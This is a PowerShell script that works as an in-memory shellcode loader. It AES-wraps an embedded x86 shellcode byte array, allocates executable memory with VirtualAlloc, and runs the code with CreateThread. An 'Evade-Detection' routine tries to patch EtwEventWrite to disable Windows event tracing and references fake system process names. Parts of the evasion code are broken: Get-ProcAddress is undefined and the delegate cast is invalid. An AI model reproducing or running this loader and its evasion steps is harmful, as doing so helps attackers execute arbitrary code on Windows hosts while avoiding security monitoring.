Add-Type -AssemblyName System.Runtime.InteropServices
Add-Type -AssemblyName System.Security.Cryptography

$code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
}
"@

Add-Type -TypeDefinition $code

function Encrypt-Payload {
    param([byte[]]$Data, [byte[]]$Key)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.IV = New-Object byte[] 16
    $encryptor = $aes.CreateEncryptor()
    return $encryptor.TransformFinalBlock($Data, 0, $Data.Length)
}

function Decrypt-Payload {
    param([byte[]]$Data, [byte[]]$Key)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.IV = New-Object byte[] 16
    $decryptor = $aes.CreateDecryptor()
    return $decryptor.TransformFinalBlock($Data, 0, $Data.Length)
}

$shellcode = [byte[]] @(
    0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64, 0x8B, 0x50, 0x30, 0x8B,
    0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28, 0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0xAC, 0x3C,
    0x61, 0x7C, 0x02, 0x2C, 0x20, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xE2, 0xF2, 0x52, 0x57, 0x8B, 0x52,
    0x10, 0x8B, 0x4A, 0x3C, 0x8B, 0x4C, 0x11, 0x78, 0xE3, 0x48, 0x01, 0xD1, 0x51, 0x8B, 0x59, 0x20,
    0x01, 0xD3, 0x8B, 0x49, 0x18, 0xE3, 0x3A, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF, 0xAC,
    0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x38, 0xE0, 0x75, 0xF6, 0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75,
    0xE4, 0x58, 0x8B, 0x58, 0x24, 0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x58, 0x1C, 0x01, 0xD3,
    0x8B, 0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59, 0x5A, 0x51, 0xFF,
    0xE0, 0x5F, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x8D, 0x5D, 0x6A, 0x01, 0x8D, 0x85, 0xB2, 0x00, 0x00,
    0x00, 0x50, 0x68, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x68, 0xA6,
    0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x53, 0xFF, 0xD5, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x2C, 0x20, 0x57,
    0x6F, 0x72, 0x6C, 0x64, 0x21, 0x00
)

$key = New-Object byte[] 32
[System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($key)

$encryptedShellcode = Encrypt-Payload -Data $shellcode -Key $key

function Execute-Shellcode {
    param([byte[]]$EncryptedPayload, [byte[]]$Key)
    
    $payload = Decrypt-Payload -Data $EncryptedPayload -Key $Key
    
    $size = $payload.Length
    $mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
    
    [System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $mem, $size)
    
    $threadId = 0
    $thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [ref]$threadId)
    
    Start-Sleep -Seconds 5
}

function Evade-Detection {
    $fakeNames = @("svchost", "explorer", "winlogon")
    $newName = $fakeNames | Get-Random
    
    $randomBytes = New-Object byte[] 1024
    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($randomBytes)
    
    $etwPatch = [byte[]] @(0xC3)
    $etwAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Get-ProcAddress ntdll.dll EtwEventWrite), [System.Type]::GetType("System.Object")
    ).Method.MethodHandle.GetFunctionPointer()
    [System.Runtime.InteropServices.Marshal]::Copy($etwPatch, 0, $etwAddr, 1)
}

try {
    Evade-Detection
    Execute-Shellcode -EncryptedPayload $encryptedShellcode -Key $key
    [System.GC]::Collect()
}
catch {
    Write-Error "Execution failed: $_"
}
